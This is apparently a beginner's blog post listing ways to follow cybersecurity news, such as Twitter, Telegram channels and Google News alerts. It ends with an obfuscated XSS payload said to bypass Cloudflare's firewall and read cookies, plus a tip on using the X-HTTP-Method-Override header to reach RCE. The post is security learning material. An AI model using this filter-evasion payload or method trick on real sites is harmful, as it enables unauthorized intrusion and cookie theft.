Many of new comers do ask about how do we get to know about latest tac-tic or latest news in the world of cybers space & which are some good resource.

Well i don't know about others but i can tell you where i keep my self up to date about cyberspace.

## Twitter 

Yeah, Twitter is best resource for learning good stuff in cyberspace, there are many good bug hunter and security resercher who share their projects and their methodology which is awsome.

Here are some Twitter Handles

## Telegram Channels

Telegram Channels are also good resource of latest updats you can search and join your wish of channels on google, there are many publicly available channels.


## Google

Google news is also one of the best way for latest news.

There's one option called *"alerts"* in the google news app where you can set the alerts you wanna get when anything new arrives regarding that topics.

That's it i guess this are enough resources for new, adding more and more resource won't make you updated and become repetitive instead.

# What I learned today :


So while scrolling across twitter i come through this tweet about bypassing Cloudflare Firewall for XSS :-

```js
<a href="j&Tab;a&Tab;v&Tab;asc&
NewLine;ri&Tab;pt&colon;
\u0061\u006C\u0065\u0072\u0074&
lpar;this['document']['cookie']&
rpar;">Xss</a>
```

And after this i found one good advice about Bug Bounty is :

> *If server only allows GET and POST method, then try adding “X-HTTP-Method -Override: PUT to achieve RCE via PUT method.*

Well That's it.!
